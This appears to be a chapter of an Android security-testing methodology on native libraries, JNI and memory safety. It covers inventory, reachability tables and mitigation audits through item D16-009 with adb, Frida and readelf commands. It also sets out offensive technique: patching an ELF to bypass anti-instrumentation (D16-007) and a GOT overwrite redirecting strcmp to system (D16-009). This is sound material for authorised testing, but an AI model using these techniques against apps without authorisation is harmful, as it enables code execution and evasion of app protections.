# D16 · Native Code, JNI & Memory Safety

> This domain is about the C/C++ that runs inside the app's own UID: what attacker bytes reach it, whether
> it mishandles them, and what a mishandle is actually worth. Its ceiling is genuinely P1 —
> `server_side_injection.remote_code_execution_rce` — because code execution in the app process inherits the
> app's permissions, its Keystore handles and its session, with no root and no sandbox escape required. Its
> floor is the largest graveyard in this methodology: every mitigation check (PIE, RELRO, canary, FORTIFY),
> every unstripped symbol table and every stale bundled library version is `lack_of_binary_hardening` or
> `using_components_with_known_vulnerabilities` — **P5, worth nothing** — until you attach it to a crash you
> reached through the app's own surface. Most testers file the floor and never reach the ceiling.

| | |
|---|---|
| **Phases** | P3 native inventory (splits, `.so` list, JNI exports, versions), P4 static (mitigation audit, JNI boundary review, memory-safety class hunt, harness build), P5 dynamic (drive the exported/deep-link/media path, fuzz, tombstone), P7 escalation (controllability, mitigation reality check, chain) |
| **Milestones** | M4 primary; M3 for the inventory items (D16-001 → D16-007), M5 for the reachability and fuzzing items (D16-035 → D16-047) |
| **VRT ceiling** | `server_side_injection.remote_code_execution_rce` (**P1**) with demonstrated code execution in the app UID; `insecure_os_firmware.command_injection` (**P1**) for a native `system()`/`popen()` sink; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) when a heap over-read or a recovered native signing key yields credentials; `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) for a reliable crash with no demonstrated control. The fallbacks are dead money: `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**), `lack_of_binary_hardening.lack_of_obfuscation` (**P5**), `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**), `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (**P5**) |
| **Primary attacker model** | AM-03 zero-permission local app driving an exported component into a native parser; AM-02 one click (deep link, downloaded/shared file) for the decoder classes; AM-01 for the 0-click media/thumbnail/notification delivery paths; AM-09 malicious backend/CDN serving malformed media. **AM-12 is not an attack** — root here is only how you read `/data/tombstones` and `/proc/<pid>/maps` |
| **Maps to** | MASVS-CODE-3, MASVS-CODE-4, MASVS-RESILIENCE-3; MASTG-TEST-0222 (PIC), MASTG-TEST-0223 (stack canaries), MASTG-TEST-0288 (debugging symbols), MASTG-TEST-0043 (LEGACY, deprecated → MASTG-KNOW-0005); MASTG-KNOW-0005, MASTG-KNOW-0006, MASTG-KNOW-0008; MASTG-TECH-0018, -0024, -0029, -0033, -0034, -0035, -0037, -0044, -0115, -0140, -0157; MASTG-TOOL-0001 (Frida), -0003 (nm), -0028 (radare2), -0030 (Angr), -0033 (Ghidra), -0036 (r2frida), -0107 (jnitrace), -0129 (rabin2), -0152 (lldb); MASWE-0045, MASWE-0050, MASWE-0061, MASWE-0044; CWE-20, CWE-122, CWE-125, CWE-190, CWE-191, CWE-197, CWE-347, CWE-415, CWE-416, CWE-476, CWE-787, CWE-798, CWE-908, CWE-77, CWE-489/497/540/912/1295; ATT&CK T1575 (Native API), T1658, T1404, T1623/T1623.001, T1631/T1631.001, T1625/T1625.001, T1407, T1617 |

## Why this domain pays

The base rate is real and it is published. AOSP's own security-model analysis puts **about 85% of Android
security vulnerabilities in unsafe memory access**, and the platform has spent a decade adding mitigations
(ASLR, CFI from 9.0, ShadowCallStack from 10, BoundSan/IntSan from 10, Scudo from 10, MTE software support
from 12, BTI and PAC-RET from 14, Rust from 12) precisely because the class does not go away. None of that
hardening applies automatically to the `.so` files the *app vendor* compiled and shipped. The academic
measurement is the number to quote to a client: LibRARIAN's study of the top 200 Google Play apps found
**53 of 200 (26.5%) carrying a known-vulnerable bundled native library**, those libraries averaged
**859.17 ± 137.55 days out of date**, and app developers took **528.71 ± 40.20 days** to adopt a patch that
the library maintainers had shipped in **54.59 ± 8.12 days**. That ten-to-one patch lag is the single
strongest argument you have for why a native-library finding is not theatre.

And yet this domain is mostly graveyard, and you must say so. Every programme in the corpus rejects the
easy half of it explicitly. Bugcrowd rates `lack_of_binary_hardening > lack_of_exploit_mitigations` and
`> lack_of_obfuscation` at **P5**, and `using_components_with_known_vulnerabilities > outdated_software_version`
at **P5**. PayPal's mobile out-of-scope list names "vulnerabilities on third party libraries without showing
specific impact to the target application (e.g. a CVE with no exploit)". Reddit, Grab, HackenProof and
Basecamp carry the same clause. Google's Android & Google Devices programme states "raw, un-minimized fuzzer
crashes are not actionable and will be closed" and makes **a proposed patch or root-cause fix mandatory for
all memory-safety reports**. Samsung says it twice — in the ineligible list and again in the downgrade
factors — that "crashes produced by artificially bypassing the product's normal attack surface (for example,
loading a native library via `dlopen` and calling its internal APIs with malformed input) are not treated as
a valid security impact unless evidence shows the same input is reachable through a real attack path".
TikTok: "A valid exploit must achieve arbitrary code execution, not just trigger an application crash."
Nextcloud #3399016, a bare crash, scored **0.0**.

The exception — the thing that makes this chapter worth its day — is the pair of reachability and
controllability. A native crash reached through an *exported component* with a fault address you chose is
not `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5); it is a memory-safety
bug in the app's UID, and the tombstone is what moves it across that category line. Meta prices the ladder
exactly: full mobile RCE up to **$300,000** (0-click ×1, 1-click ×0.75, 2+ click ×0.5), an *exploitable
crash* PoC up to **$120,000**, memory/information disclosure up to **$20,000**. So the whole job is:
inventory the native surface, find the one entry point attacker bytes actually reach, get a crash there,
prove control or honestly decline to claim it, and name every mitigation layer that stood between your
primitive and code execution. The last part is what stops the over-claim that gets a native report closed.

## The crux question

**Which bytes that an attacker fully controls reach C/C++ inside this app's process, by what path they get
there, and does the code that consumes them compute a size, an index or a lifetime from those same bytes
without checking it?**

## Triage order

1. **Pull every ABI split and list the `.so` files** (D16-001, D16-002). Native libraries live in
   `split_config.<abi>.apk`, not in `base.apk`; analysing base alone silently deletes this entire chapter
   and produces a false "no native code" negative.
2. **Build the reachability table before reading a single instruction** (D16-003 → D16-005). `.so` → JNI
   entry → the Java caller → where that caller's data comes from → which attacker model can supply it. Every
   later item is scoped by this table; without it you will fuzz code nobody can reach.
3. **Version-fingerprint the third-party libraries** (D16-006). It costs five minutes and tells you whether
   you are hunting the vendor's own bugs or a known decoder CVE with a public PoC.
4. **Run the mitigation sweep once, and park the output** (D16-008 → D16-016). It is P5 on its own. You are
   collecting it now so that when you have a crash you can rate it in the same hour, and so you know which
   layers you have to argue past.
5. **Review the JNI boundary with jnitrace before disassembling anything** (D16-017 → D16-023). The boundary
   shows you the strings, lengths and buffers actually crossing, which is faster than static reversing and
   catches the dynamically-registered methods.
6. **Hunt the four arithmetic classes first** (D16-024 → D16-027). `int * int`, signed truncation, additive
   wrap, and two-source dimension mismatch account for every worked case in this corpus. They are cheap to
   grep for and they are where the Criticals are.
7. **Drive the reachable entry point and capture a tombstone** (D16-035, D16-048). The tombstone is the
   artefact that changes the VRT category. No tombstone, no memory-safety finding.
8. **Only then fuzz** (D16-043 → D16-047). Fuzzing is the expensive option and it is worthless if the
   harness calls an entry point no real caller reaches (D16-045).
9. **Run the mitigation reality check before writing severity** (D16-053 → D16-060). Name the layer that
   stopped you. "Arbitrary write → RCE" without that paragraph is the most-downgraded claim in mobile
   security.

## Items

### D16-001 · Pull every ABI split before concluding the app has no native code

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; a missed split is a false negative across the whole chapter) |
| **Attacker** | n/a (acquisition) |
| **Applies to** | all app-bundle-delivered apps, i.e. effectively every Play-distributed app |
| **Maps to** | MASTG-TECH-0157 (Extracting Bundled Native Libraries); MASWE-0045 |

- **Test:** Confirm you hold `base.apk` **and every** `split_config.*`. Native libraries are packaged into
  the ABI split, not into base. An analyst who decompiles only `base.apk` will report "no native code" on an
  app that ships twelve `.so` files.
- **How:**
  ```bash
  PKG=com.target.app
  mkdir -p work/apk && cd work/apk
  for p in $(adb shell pm path $PKG | sed 's/package://' | tr -d '\r'); do adb pull "$p" .; done
  shasum -a 256 *.apk                       # artefact identity — record this in the report
  for a in *.apk; do echo "== $a"; unzip -l "$a" | grep '\.so$'; done
  # third-party mirror acquisition: verify the download is not truncated before believing an empty result
  file base.apk; wc -c < base.apk
  unzip -o base.apk -d x/ || 7z x -y base.apk -o"x"     # 7z recovers entries unzip rejects
  # and check how the libraries are packaged
  grep -n 'extractNativeLibs' x/AndroidManifest.xml 2>/dev/null || \
    aapt2 dump xmltree base.apk --file AndroidManifest.xml | grep -i extractNativeLibs
  ```
- **Proof:** `pm path` prints ≥2 lines and your local directory holds the same count; `.so` names appear in
  the ABI split listing and are absent from `base.apk`. Record the per-file SHA-256 set — that is the
  artefact identity every later finding is anchored to.
- **Escalation:** The split inventory feeds D02 (signing/build integrity of each split), D19 (Flutter
  `libapp.so` / Hermes), and every item below. A library that exists **only** in a split is a common
  blind spot — nobody else reviewed it.
- **Ruled out when:** `pm path` returns exactly one path, `unzip -l` on it shows no `lib/` entries, and
  `adb shell cat /proc/<pid>/maps | grep -c '/data/app.*\.so'` returns 0 at runtime after exercising the
  app's main flows — i.e. the app genuinely has no native code of its own and loads none. A silent tool is
  not enough; you need the runtime map check (D16-002) as well.

### D16-002 · Diff the runtime module list against the APK — find the `.so` that is never on disk

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | n/a standalone; the hidden code's behaviour decides the path (→ D17) |
| **Attacker** | AM-12 for the dump itself (evidence tool); the finding is about what the hidden code does |
| **Applies to** | packed/protected apps, apps with commercial RASP, apps with plugin SDKs |
| **Maps to** | MASTG-TECH-0029 (Listing Loaded Native Libraries), MASTG-TOOL-0001; ATT&CK T1407, T1575 |

- **Test:** Packers and some SDKs decrypt a `.so` at runtime and map it from memory or a `memfd`, so it never
  appears in the APK and static review misses it entirely. Compare what is *loaded* against what is
  *shipped*.
- **How:**
  ```bash
  PID=$(adb shell pidof com.target.app)
  adb shell cat /proc/$PID/maps | grep -E '\.so|memfd:|r-xp' | awk '{print $6}' | sort -u > runtime.txt
  unzip -l base.apk split_config.*.apk | grep -oE 'lib/[^ ]*\.so' | sort -u > shipped.txt
  comm -23 runtime.txt shipped.txt          # loaded but not shipped
  ```
  Catch the load itself and dump it:
  ```bash
  frida-trace -U -n com.target.app -i 'libc.so!memfd_create' -i 'libdl.so!android_dlopen_ext' -i 'libc.so!mmap'
  # or sweep and stream every mapped ELF back:
  git clone https://github.com/TheQmaks/sosaver && cd sosaver && uv sync && source .venv/bin/activate
  sosaver com.target.app -o /tmp/so-dumps --debug
  ```
- **Proof:** A reconstructed ELF from an anonymous or `memfd:` mapping that `readelf -h` parses and that does
  not exist anywhere in the APK set; or a `comm -23` line naming a module path under `/data/` that is absent
  from `shipped.txt`.
- **Escalation:** → D17 (dynamic code loading / update verification): if the hidden library is *fetched*
  rather than merely decrypted, the fetch channel is the finding. If the on-disk copy and the dumped copy
  diverge, that is runtime code generation. The dumped library then re-enters this chapter at D16-003.
- **Ruled out when:** `comm -23` is empty after driving the full app (login, main flows, the feature that
  uses native code), and no `memfd_create`/`android_dlopen_ext` call appears in a Frida trace across that
  same run. State which flows you exercised — a library loaded only on a payment screen you never opened is
  a false negative.

### D16-003 · Enumerate every `Java_*` export and bind each one to its Java declaration

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; the reachable entry point is the finding) |
| **Attacker** | n/a (mapping) |
| **Applies to** | all apps shipping `lib/*/*.so` |
| **Maps to** | MASTG-TECH-0140 (Obtaining Debugging Information and Symbols), MASTG-TECH-0157, MASTG-TOOL-0003 (nm), MASTG-TOOL-0129 (rabin2), MASTG-TOOL-0028 (radare2); ATT&CK T1575 |

- **Test:** `Java_<pkg>_<Class>_<method>` exports are the exact set of native functions the managed layer can
  call by static binding. Enumerate them, then find each one's Java declaration so you know what type and
  length of data it receives.
- **How:**
  ```bash
  unzip -o base.apk 'lib/*' -d libs/ ; unzip -o split_config.arm64_v8a.apk 'lib/*' -d libs/
  for so in libs/lib/*/*.so; do
    echo "== $so"
    nm -D --defined-only "$so" 2>/dev/null | grep ' T Java_'
    objdump -T "$so" 2>/dev/null | grep -E 'Java_|JNI_OnLoad'
  done
  rabin2 -s libs/lib/arm64-v8a/libtarget.so | grep JNI          # MASTG-TOOL-0129
  r2 -A libs/lib/arm64-v8a/libtarget.so                          # then:  is~JNI
  # bind each export back to its Java declaration
  jadx -d out base.apk
  grep -rn '\bnative\b .*(' out/sources/ | grep -vE '^\s*//' | head -60
  grep -rn 'System.loadLibrary\|System.load(' out/sources/
  ```
- **Proof:** A table with one row per export: `libtarget.so : Java_com_target_Codec_decode` ↔
  `com.target.Codec.decode(byte[], int, int)` ↔ declared in `Codec.java:41`. The two `int` parameters next to
  a `byte[]` are the shape you are hunting — an attacker-supplied offset and length.
- **Escalation:** Feeds D16-005 (the reachability table) and D21 (a `Java_*_isRooted`-shaped export is a
  RASP bypass target). An export whose Java caller is inside an exported component goes straight to D16-035.
- **Ruled out when:** every `.so` in the app is a framework runtime with no app-specific `Java_*` export
  (Flutter's `libflutter.so`, Hermes' `libhermes.so`, the RN core set) **and** the dynamic-registration check
  in D16-004 also comes back empty. Absence of `Java_*` symbols alone proves nothing — see D16-004.

### D16-004 · Catch the `RegisterNatives` methods that have no `Java_*` export

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; this is the single largest false-negative source in native enumeration) |
| **Attacker** | n/a (mapping) |
| **Applies to** | all apps with native code; universal in obfuscated and packed builds |
| **Maps to** | MASTG-TECH-0035 (JNI Tracing), MASTG-TECH-0034 (Native Code Tracing), MASTG-TOOL-0107 (jnitrace), MASTG-TOOL-0001; ATT&CK T1575 |

- **Test:** A library that calls `RegisterNatives()` inside `JNI_OnLoad` binds native methods at runtime.
  Those methods have **no `Java_*` symbol**, so `nm -D` shows nothing and a static-only enumeration reports
  "no JNI surface" on an app with a large one. Dump the `JNINativeMethod` table at runtime.
- **How:**
  ```bash
  strings -a libs/lib/arm64-v8a/libtarget.so | grep -n 'RegisterNatives'
  frida-trace -U -f com.target.app -i 'RegisterNatives' -i 'JNI_OnLoad' -i 'dlopen*' --no-pause
  ```
  Read the struct array directly — `JNINativeMethod` is `{const char* name; const char* signature; void* fnPtr;}`,
  so 3 pointers per entry:
  ```javascript
  // frida -U -f com.target.app -l regnatives.js --no-pause
  const RN = Module.getExportByName(null, 'RegisterNatives') ||
             Module.findExportByName('libart.so', '_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi');
  Interceptor.attach(RN, {
    onEnter(a) {
      const cls = a[1], arr = a[2], n = a[3].toInt32();
      const ptrSize = Process.pointerSize;
      console.log('[RegisterNatives] count=' + n);
      for (let i = 0; i < n; i++) {
        const base = arr.add(i * 3 * ptrSize);
        console.log('   ' + base.readPointer().readCString() +
                    '  ' + base.add(ptrSize).readPointer().readCString() +
                    '  @ ' + DebugSymbol.fromAddress(base.add(2 * ptrSize).readPointer()));
      }
    }
  });
  ```
  Cross-check with the boundary trace, which sees every call regardless of how it was bound:
  ```bash
  pip install jnitrace
  jnitrace -l libtarget.so com.target.app
  ```
- **Proof:** A printed method table — name, JNI signature, and the resolved function address in
  `libtarget.so` — for methods that do not appear in `nm -D` output. The signature string
  (`([BII)Ljava/lang/String;`) tells you the parameter types without decompiling anything.
- **Escalation:** Each recovered method joins D16-005. A dynamically registered method is *more* interesting
  than a statically bound one, because it was hidden and because the developers thought it was hidden.
- **Ruled out when:** the `RegisterNatives` hook fires zero times across a full app exercise **and**
  `strings | grep RegisterNatives` is empty in every shipped `.so`. If the hook never fires because the app
  detected Frida, that is not a negative — that is D21 blocking your coverage, and it goes on the blocked
  register.

### D16-005 · Build the reachability table: `.so` → JNI entry → data source → attacker model

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; this table is what scopes every other item in the chapter) |
| **Attacker** | n/a (it assigns the attacker model to each row) |
| **Applies to** | all apps shipping native code |
| **Maps to** | MASTG-KNOW-0005 (Memory Corruption Bugs), MASWE-0050 (CWE-20); `developer.android.com/privacy-and-security/risks/use-of-native-code`; ATT&CK T1575 |

- **Test:** For every native entry point, answer one question: **what attacker-controlled data reaches it,
  and through which app surface?** This is the table that decides whether this chapter has a finding. Rows
  with no attacker-reachable data source are informational and stay that way no matter what the code does.
- **How:** Take the export list from D16-003/D16-004 and trace each Java declaration's callers backwards to
  a source.
  ```bash
  S=out/sources
  for m in decode parse load init verify sign; do
    echo "== $m"; grep -rn "\.$m(" $S | grep -vE '^\S+/(android|androidx|kotlin|com/google/android)/' | head
  done
  # which callers sit behind an externally reachable surface?
  grep -rn 'getIntent()\|getExtras()\|getData()\|onReceive\|openFile\|onStartCommand\|onMessageReceived' $S -A12 \
    | grep -nE 'decode|parse|native|Codec|Parser'
  # and which read from the network / disk / a content URI?
  grep -rn 'InputStream\|okhttp3\|Retrofit\|getContentResolver().openInputStream' $S -A8 | grep -nE 'decode|parse'
  ```
  Confirm at runtime that your bytes really arrive:
  ```javascript
  Interceptor.attach(Module.getExportByName('libtarget.so', 'Java_com_target_Codec_decode'), {
    onEnter(a) { console.log('[JNI] decode len=' + a[4].toInt32() + ' first8=' + hexdump(a[3], {length: 8})); }
  });
  ```
- **Proof:** A completed table with these columns, one row per entry point: `library | JNI entry | Java
  declaration (file:line) | reachable from (exported component / deep link / provider openFile / network
  response / media scan / local UI only) | attacker model | bytes fully or partially controlled`. The Frida
  `[JNI]` line printed by input **you** supplied is the row's evidence.
- **Escalation:** Rows marked AM-01/AM-02/AM-03 go to D16-035 (drive it) and D16-043 (fuzz it). Rows marked
  "local UI only" are parked — they are the client's hardening appendix, not a report.
- **Ruled out when:** every row's data source is either app-internal constants or values the app generated
  itself (a session id it minted, a file it wrote), verified by reading the caller chain to its origin — not
  by assuming from the method name. Write the table with the empty right-hand column; that *is* the
  defensible negative for this domain.

### D16-006 · Version-fingerprint every bundled third-party library from `.rodata`

| | |
|---|---|
| **Severity ceiling** | Low standalone (Support in practice); rated by the advisory **only** with a reachability argument |
| **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**) alone — escalates into the memory-safety items only with a demonstrated path |
| **Attacker** | AM-02 / AM-09 for the decoder classes once reachability is shown |
| **Applies to** | all apps with `lib/*/*.so`; Maven-coordinate SCA cannot see any of this |
| **Maps to** | MASWE-0044 (Dependencies with Known Vulnerabilities, CWE-1395/CWE-1357); VRT `using_components_with_known_vulnerabilities`; LibRARIAN version-identification methodology |

- **Test:** Native libraries are the least-patched part of an Android app and are invisible to dependency
  scanners. Recover each bundled library's version from its own strings and ELF metadata, then check it
  against advisories — and stop there until you have a reachable path.
- **How:** The LibRARIAN regex set, which is what actually matches real `.rodata` version banners:
  ```bash
  unzip -o base.apk 'lib/*' -d x; unzip -o split_config.*.apk 'lib/*' -d x
  for so in $(find x/lib -name '*.so'); do
    echo "=== $so"
    strings -a "$so" | grep -aoE 'ffmpeg-([0-9]\.)*[0-9]|openssl-1(\.[0-9])*[a-z]|OpenSSL 1\.[0-9]\.[0-9][a-z]?|^3\.([0-9]{1,}\.)+[0-9]|libpng version [0-9.]+|libjpeg-turbo [0-9.]+|zlib [0-9.]+|libxml2-[0-9.]+|GIFLIB [0-9.]+|WebP [0-9.]+' | sort -u
    readelf -d "$so" | grep -E 'NEEDED|SONAME'
    readelf -pcomment "$so" 2>/dev/null | head -3       # toolchain/NDK identity
    sha256sum "$so"
  done
  # WebRTC/video SDKs carry their own banner form
  strings -a x/lib/*/libjingle_peerconnection_so.so 2>/dev/null | \
    grep -aoE 'WebRTC/M[0-9]+|branch-heads/[0-9]+|[0-9]{5,}\.[0-9]+\.[0-9]+' | sort -u
  ```
- **Proof:** A table of `.so path | library | version string | matching advisory`, with the raw `strings`
  line quoted as evidence. Two different version strings for the same library across two ABI splits is its
  own finding — it proves the build pipeline ships unreviewed prebuilts.
- **Escalation:** A matched version is half a finding. The other half is D16-005's reachability row plus a
  crash (D16-035) or an ASan report (D16-044). Named reachable decoder CVEs in this corpus, for calibration
  only — never cite one without verifying the version yourself: **CVE-2023-4863** (libwebp ≤ 1.3.1 heap
  overflow), **CVE-2019-11932** (WhatsApp 2.19.216 GIF double-free, EDB 47515), **CVE-2025-27363** (FreeType
  ≤ 2.13.0), **CVE-2022-2294** (libwebrtc, reachable only with SDP munging), **CVE-2023-7024** and
  **CVE-2024-5493** (later WebRTC heap overflows), **CVE-2016-3861** (libutils UTF16→UTF8, EDB 40354).
  Google's App Security Improvement programme ran store-wide removal campaigns for libpng and libjpeg-turbo
  (2016-06-16) and for OpenSSL (logjam, CVE-2015-3194, CVE-2014-0224), Libupup (CVE-2015-8540), Apache
  Cordova (CVE-2015-5256, CVE-2015-1835, CVE-2014-3500, CVE-2014-3501, CVE-2014-3502) and GnuTLS — most of
  those are **LEGACY**; report them only against a matched version string, never on library presence.
- **Ruled out when:** every bundled third-party library's recovered version is at or above the fixed release
  in the relevant advisory, evidenced by the version string itself; **or** the version is stale but the
  library has no entry point in the D16-005 table with an attacker-controlled data source, in which case you
  write it into the hardening appendix and say explicitly that reachability was not established. "The SCA
  tool reported nothing" is not a negative here — SCA cannot see native code.

### D16-007 · `JNI_OnLoad` and `.init_array` constructors: code that runs before any Java

| | |
|---|---|
| **Severity ceiling** | Medium (as undocumented native anti-analysis in a production build); Support otherwise |
| **VRT** | `lack_of_binary_hardening.runtime_instrumentation_based` (**P5**) if you file the RASP observation alone — file it under D21 instead, or as context |
| **Attacker** | AM-12 (your own instrumentation is being blocked); AM-03 when the constructor itself parses attacker data |
| **Applies to** | apps with commercial packers/RASP; any library with a C++ static initialiser that touches external state |
| **Maps to** | MASTG-TECH-0034 (Native Code Tracing), MASTG-TOOL-0001; MASVS-RESILIENCE-3; ATT&CK T1575, T1617 |

- **Test:** ELF constructors in `.init_array` run at `dlopen` time — **before `JNI_OnLoad`** and long before
  any Java code, so Java-level hooks never fire. Two consequences: detection logic placed there defeats naive
  instrumentation (a coverage problem you must record), and any parsing done there is reachable the instant
  the library loads.
- **How:**
  ```bash
  readelf -d libs/lib/arm64-v8a/libtarget.so | grep -E 'INIT_ARRAY|INIT\b|FINI_ARRAY'
  readelf -x .init_array libs/lib/arm64-v8a/libtarget.so
  readelf -r libs/lib/arm64-v8a/libtarget.so | grep -i relative | head        # constructor addrs land here
  objdump -T libs/lib/arm64-v8a/libtarget.so | grep JNI_OnLoad
  ```
  Observe them at runtime, and get control if they block you:
  ```bash
  frida-trace -U -f com.target.app -i 'JNI_OnLoad' -i 'android_dlopen_ext' --no-pause
  ```
  To regain early instrumentation on an ARM64 ELF: locate the `.init_array` VA range, compute the constructor
  address from the RELATIVE relocation landing in it, remove the auto-run tags so the loader skips
  `.init_array`, add an exported `FUNC` symbol (e.g. `INIT0`) at the constructor address in the `.text`
  section index, and rename `JNI_OnLoad` → `JNI_OnLoad0` to block implicit ART initialisation — then call the
  renamed entry points on your own schedule with Frida attached.
- **Proof:** The `.init_array` hexdump with a non-null entry, plus the app launching with Frida attached
  where it previously died at spawn, plus the detection routine now observable as an explicitly callable
  symbol.
- **Escalation:** → D21 (the RASP itself); → D16-005 if the constructor reads a file or an environment value
  an attacker can influence. Record the coverage cost in the blocked register if you cannot neutralise it.
- **Ruled out when:** `.init_array` is absent or contains only the compiler's own static-initialisation
  thunks (no cross-references to `fopen`/`access`/`ptrace`/`__system_property_get`), and `JNI_OnLoad` does
  nothing but `RegisterNatives` and a version return. Verify by reading the constructor's disassembly, not by
  the section being small.

### D16-008 · Per-`.so` mitigation sweep — run it on THIS binary, and count your results

| | |
|---|---|
| **Severity ceiling** | Low (Support in practice) |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) standalone |
| **Attacker** | n/a (rating input) |
| **Applies to** | all apps shipping `.so`; the check is per-binary and per-NDK, never per-OS-version |
| **Maps to** | MASTG-TEST-0222, MASTG-TEST-0223, MASTG-TECH-0115 (Obtaining Compiler-Provided Security Features), MASTG-KNOW-0006 (Binary Protection Mechanisms), MASWE-0045; MASVS-CODE-3/4 |

- **Test:** The mitigation timeline is per-release **and** per-NDK. An app's own `.so` built with an old NDK
  can lack PIE, RELRO or NX on a fully patched device. Read the state off each binary; never infer it from
  the device's OS version.
- **How:** The whole sweep, per library:
  ```bash
  readelf -h  lib.so | grep Type:              # DYN = PIE/randomised · EXEC = fixed base
  readelf -lW lib.so | grep GNU_STACK          # RW = NX enforced · RWE (or absent) = executable data
  readelf -lW lib.so | grep GNU_RELRO          # GNU_RELRO segment present?
  readelf -d  lib.so | grep -E 'BIND_NOW|FLAGS' # BIND_NOW/NOW as well => FULL RELRO (read-only GOT)
  readelf -sW lib.so | grep -c __stack_chk_fail # 0 = no canary references
  readelf -sW lib.so | grep -E '_chk$|_FORTIFY' # FORTIFY: __memcpy_chk, __sprintf_chk, ...
  execstack -q lib.so                           # '-' = NX · 'X' = exec stack · '?' = unmarked
  rabin2 -I lib.so                              # one-line summary: canary/pic/nx/relro/stripped
  checksec --file=lib.so
  ```
  **Do not write this as a shell array loop.** Shell loops over computed lists fail silently — an
  unpopulated array produces zero iterations with no error and output that looks complete. Drive it from
  Python with per-iteration logging and an explicit count:
  ```python
  #!/usr/bin/env python3
  import glob, subprocess, json, sys
  libs = sorted(glob.glob('x/lib/*/*.so'))
  print(f'[i] {len(libs)} libraries to audit', file=sys.stderr)
  rows = []
  for i, so in enumerate(libs, 1):
      row = {'lib': so}
      try:
          row['type']   = 'DYN' if b'DYN' in subprocess.run(['readelf','-h',so],capture_output=True).stdout else 'EXEC'
          lw            = subprocess.run(['readelf','-lW',so],capture_output=True).stdout.decode('utf8','replace')
          row['relro']  = 'GNU_RELRO' in lw
          row['nx']     = ('RWE' not in [l for l in lw.splitlines() if 'GNU_STACK' in l][0]) if 'GNU_STACK' in lw else False
          d             = subprocess.run(['readelf','-d',so],capture_output=True).stdout.decode('utf8','replace')
          row['bindnow']= 'BIND_NOW' in d or 'NOW' in d
          s             = subprocess.run(['readelf','-sW',so],capture_output=True).stdout.decode('utf8','replace')
          row['canary'] = s.count('__stack_chk_fail')
          row['fortify']= len([l for l in s.splitlines() if l.rstrip().endswith('_chk')])
      except Exception as e:
          row['error'] = repr(e)
      rows.append(row); print(f'[{i}/{len(libs)}] {so} {row}', file=sys.stderr)
  assert len(rows) == len(libs), 'lost rows — the sweep ate something'
  print(json.dumps(rows, indent=2))
  ```
  Then confirm the runtime side on the test device:
  ```bash
  adb shell cat /proc/self/maps | grep -E '(stack|heap)'        # look for rwxp
  adb shell cat /proc/sys/kernel/randomize_va_space             # 0 none · 1 all-but-heap · 2 full
  adb shell cat /proc/sys/vm/mmap_min_addr
  adb shell cat /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict
  ```
- **Proof:** The JSON row set, quoted per library in the report appendix, with the count line proving no
  library was skipped. The reference NDK timeline for reading a result: stack cookies since **r1**,
  non-executable stack **r4b**, RELRO + BIND_NOW **r8b**, PIE **r8c**, `-Wformat-security` **r9**.
- **Escalation:** Each gap becomes an aggravating factor *inside* a real memory-safety finding (D16-053).
  `bindnow: false` is the one that is a live primitive on its own — see D16-009.
- **Ruled out when:** every shipped `.so` shows `DYN`, `GNU_RELRO` present with `BIND_NOW`, `GNU_STACK` `RW`,
  and a non-zero `__stack_chk_fail` count (or falls under a documented D16-011 false positive) — **and** you
  can show the row count equals the library count. Do not report this as a finding either way: a clean sweep
  is a paragraph in the hardening appendix.

### D16-009 · Partial RELRO — the writable GOT is the one mitigation gap that is a primitive

| | |
|---|---|
| **Severity ceiling** | Low standalone; it is the **multiplier** that turns a limited write into code execution |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) alone; cite it inside `server_side_injection.remote_code_execution_rce` (P1) when you use it |
| **Attacker** | AM-03 / AM-02, whichever reaches the write primitive |
| **Applies to** | any `.so` with `GNU_RELRO` but no `BIND_NOW` |
| **Maps to** | MASTG-KNOW-0006, MASWE-0045; MASVS-CODE-3 |

- **Test:** `GNU_RELRO` alone marks only the non-PLT relocations read-only. Without `BIND_NOW` the GOT stays
  writable for the process's lifetime, so a single controlled 8-byte write into it redirects a library call —
  no shellcode, no ROP, and portable across builds.
- **How:**
  ```bash
  readelf -lW lib.so | grep GNU_RELRO        # present?
  readelf -d  lib.so | grep -E 'BIND_NOW|FLAGS.*NOW'   # absent => PARTIAL RELRO
  readelf -r  lib.so | grep -E 'JUMP_SLOT'   # the entries that stay writable
  # confirm at runtime which mapping holds the GOT and its permissions
  adb shell cat /proc/$(adb shell pidof com.target.app)/maps | grep libtarget.so
  ```
  The canonical use is to swap an import you can then trigger — `GingerBreak` walked backwards from a
  heap array through a negative index into `vold`'s GOT, replaced `strcmp` with `system`, and sent a command
  whose "string" was a path to execute. No shellcode, no ROP. (`GingerBreak` itself is **DEAD**, patched
  pre-4.x; the *technique* is what transfers.)
- **Proof:** `GNU_RELRO` present + `BIND_NOW` absent in `readelf`, plus the `JUMP_SLOT` relocation list
  naming an import (`strcmp`, `memcpy`, `free`) that the target calls with attacker-influenced arguments
  *after* your write lands.
- **Escalation:** This is the shortest path from D16-033 (arbitrary write) to
  `server_side_injection.remote_code_execution_rce` (P1). Prefer it to ROP — simplicity is reliability.
- **Ruled out when:** `readelf -d` shows `BIND_NOW` (or `FLAGS: NOW`) on every library carrying a write
  primitive you can reach, meaning the GOT is read-only after relocation. Note that full RELRO is
  **not practically removable** by patching the binary, so this is a genuine hard stop, not an inconvenience.

### D16-010 · Non-PIE library (`Type: EXEC`) — LEGACY, and what it actually tells you in 2026

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) |
| **Attacker** | n/a (rating input) |
